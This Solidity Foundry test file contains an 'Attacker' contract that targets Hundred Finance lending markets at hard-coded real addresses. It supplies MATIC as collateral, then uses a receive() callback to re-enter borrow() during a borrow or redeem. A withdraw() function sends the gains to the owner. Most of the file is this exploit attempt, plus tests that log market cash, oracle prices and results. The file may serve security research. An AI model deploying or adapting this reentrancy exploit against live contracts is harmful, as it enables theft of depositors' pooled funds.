// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";

interface ICEther {
    function mint() external payable;
    function borrow(uint256 borrowAmount) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function getCash() external view returns (uint256);
    function borrowBalanceCurrent(address) external returns (uint256);
    function exchangeRateCurrent() external returns (uint256);
    function accrueInterest() external returns (uint256);
}

interface ICToken {
    function mint(uint256 mintAmount) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function getCash() external view returns (uint256);
    function underlying() external view returns (address);
    function borrowBalanceCurrent(address) external returns (uint256);
}

interface IComptroller {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
    function markets(address) external view returns (bool isListed, uint256 collateralFactorMantissa, bool isComped);
    function getAllMarkets() external view returns (address[] memory);
    function oracle() external view returns (address);
}

interface IPriceOracle {
    function getUnderlyingPrice(address cToken) external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract Attacker {
    ICEther public hMATIC = ICEther(0xEbd7f3349AbA8bB15b897e03D6c1a4Ba95B55e31);
    ICToken public hUSDC = ICToken(0x607312a5C671D0C511998171e634DE32156e69d0);
    IComptroller public comptroller = IComptroller(0xEdBA32185BAF7fEf9A26ca567bC4A6cbe426e499);

    uint256 public reentryCount;
    uint256 public maxReentry = 3;
    bool public attacking;
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function attack() external payable {
        // Step 1: Enter hMATIC market as collateral
        address[] memory markets = new address[](1);
        markets[0] = address(hMATIC);
        comptroller.enterMarkets(markets);

        // Step 2: Mint hMATIC with our MATIC
        hMATIC.mint{value: msg.value}();

        // Step 3: Borrow MATIC (this should send native MATIC to us, triggering receive())
        uint256 borrowAmount = msg.value * 70 / 100; // 70% of collateral
        attacking = true;
        reentryCount = 0;
        uint256 err = hMATIC.borrow(borrowAmount);
        attacking = false;

        // If we get here, borrow succeeded
        // Check if reentrancy worked
    }

    function attackRedeem() external payable {
        address[] memory markets = new address[](1);
        markets[0] = address(hMATIC);
        comptroller.enterMarkets(markets);

        hMATIC.mint{value: msg.value}();

        // Try to redeem during reentrancy
        uint256 redeemAmount = msg.value * 50 / 100;
        attacking = true;
        reentryCount = 0;
        hMATIC.redeemUnderlying(redeemAmount);
        attacking = false;
    }

    receive() external payable {
        if (attacking && reentryCount < maxReentry) {
            reentryCount++;
            // Try to borrow again during the callback
            uint256 cash = hMATIC.getCash();
            if (cash > 1 ether) {
                try hMATIC.borrow(1 ether) returns (uint256 err) {
                    // If err == 0, reentrancy worked!
                } catch {
                    // Reentrancy blocked
                }
            }
        }
    }

    function withdraw() external {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }
}

contract HundredReentrancyTest is Test {
    ICEther hMATIC = ICEther(0xEbd7f3349AbA8bB15b897e03D6c1a4Ba95B55e31);
    ICToken hUSDC = ICToken(0x607312a5C671D0C511998171e634DE32156e69d0);
    ICToken hDAI = ICToken(0xE4e43864ea18d5E5211352a4B810383460aB7fcC);
    ICToken hUSDT = ICToken(0x103f2CA2148B863942397dbc50a425cc4f4E9A27);
    ICToken hFRAX = ICToken(0x2c7a9d9919f042C4C120199c69e126124d09BE7c);
    ICToken hETH = ICToken(0x243E33aa7f6787154a8E59d3C27a66db3F8818ee);
    IComptroller comptroller = IComptroller(0xEdBA32185BAF7fEf9A26ca567bC4A6cbe426e499);

    address attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_checkLiquidity() public {
        // Check all market cash balances
        console.log("=== Hundred Finance Markets ===");
        console.log("hMATIC cash:", hMATIC.getCash());
        console.log("hUSDC cash:", hUSDC.getCash());
        console.log("hDAI cash:", hDAI.getCash());
        console.log("hUSDT cash:", hUSDT.getCash());
        console.log("hFRAX cash:", hFRAX.getCash());
        console.log("hETH cash:", hETH.getCash());

        // Check oracle
        IPriceOracle oracle = IPriceOracle(comptroller.oracle());
        console.log("MATIC price:", oracle.getUnderlyingPrice(address(hMATIC)));
        console.log("USDC price:", oracle.getUnderlyingPrice(address(hUSDC)));
    }

    function test_reentrancyBorrow() public {
        vm.startPrank(attacker);

        Attacker atk = new Attacker();

        // Send 50 MATIC to attacker contract
        payable(address(atk)).transfer(50 ether); // actually use attack()

        // Run the attack
        atk.attack{value: 50 ether}();

        console.log("Reentry count:", atk.reentryCount());
        console.log("Attacker balance:", address(atk).balance);
        console.log("hMATIC balance of attacker:", hMATIC.balanceOf(address(atk)));

        vm.stopPrank();
    }

    function test_supplyAndBorrowUSDC() public {
        // Test: supply MATIC as collateral, borrow USDC
        vm.startPrank(attacker);

        // Enter markets
        address[] memory markets = new address[](1);
        markets[0] = address(hMATIC);
        comptroller.enterMarkets(markets);

        // Mint hMATIC
        hMATIC.mint{value: 50 ether}();
        console.log("hMATIC minted:", hMATIC.balanceOf(attacker));

        // Check liquidity
        (uint256 err, uint256 liquidity, uint256 shortfall) = comptroller.getAccountLiquidity(attacker);
        console.log("Error:", err);
        console.log("Liquidity:", liquidity);
        console.log("Shortfall:", shortfall);

        // Borrow USDC (6 decimals)
        // MATIC price ~$1.37, 50 MATIC = ~$68.5, 75% CF = ~$51.4 liquidity
        // Borrow $40 USDC
        uint256 borrowResult = hUSDC.borrow(40 * 1e6);
        console.log("Borrow result:", borrowResult);

        IERC20 usdc = IERC20(hUSDC.underlying());
        console.log("USDC balance:", usdc.balanceOf(attacker));

        vm.stopPrank();
    }
}
